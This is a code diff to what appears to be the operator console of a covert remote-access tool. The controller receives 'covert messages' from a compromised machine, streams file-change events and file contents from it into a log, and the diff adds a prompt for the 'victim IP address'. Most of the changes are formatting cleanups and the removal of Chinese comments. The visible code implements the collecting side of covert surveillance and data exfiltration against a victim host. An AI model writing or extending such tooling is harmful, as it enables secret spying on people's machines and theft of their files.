@@ -304,7 +304,6 @@ def cmd_monitor_file(comm: Commander):
         try:
             buffer = ""
 
-            # 把第一条确认消息也丢进 buffer
             first = comm.recv_covert_message()
             print(first)
             if first:
@@ -317,31 +316,28 @@ def cmd_monitor_file(comm: Commander):
                     continue
                 buffer += chunk.decode('utf-8', errors='ignore')
 
-                # 只要有换行，就拆分出完整的行来
                 while '\n' in buffer:
                     line, buffer = buffer.split('\n', 1)
 
-                    # 提取花括号里的 JSON
                     start = line.find('{')
-                    end   = line.rfind('}')
+                    end = line.rfind('}')
                     if start == -1 or end == -1:
-                        # 如果这行里不包含完整 JSON，就跳过
                         continue
 
-                    json_str = line[start:end+1]
+                    json_str = line[start:end + 1]
                     try:
                         msg = json.loads(json_str)
                     except json.JSONDecodeError:
                         continue
 
                     # 打印并记录
-                    ts   = msg.get('timestamp','')
-                    typ  = msg.get('type','')
-                    path = msg.get('path','')
+                    ts = msg.get('timestamp', '')
+                    typ = msg.get('type', '')
+                    path = msg.get('path', '')
                     print(f"[{ts}] Event: {typ} | File: {path}")
                     if 'content' in msg:
                         print(msg['content'])
-                    print('-'*40)
+                    print('-' * 40)
 
                     logfile.write(json.dumps(msg, ensure_ascii=False) + "\n")
                     logfile.flush()
@@ -349,7 +345,6 @@ def cmd_monitor_file(comm: Commander):
         except KeyboardInterrupt:
             print("\n[*] Stopping File Watching")
             comm.send_covert_message(b"CMD_STOP_MON_FILE")
-
 
 
 def cmd_monitor_dir(comm: Commander):
@@ -420,6 +415,9 @@ comm = None
 
 
 def main():
+    global VICTIM_IP
+    VICTIM_IP = input("Enter victim IP address: ").strip()
+
     comm = Commander()
     while True:
         if not comm.connected:
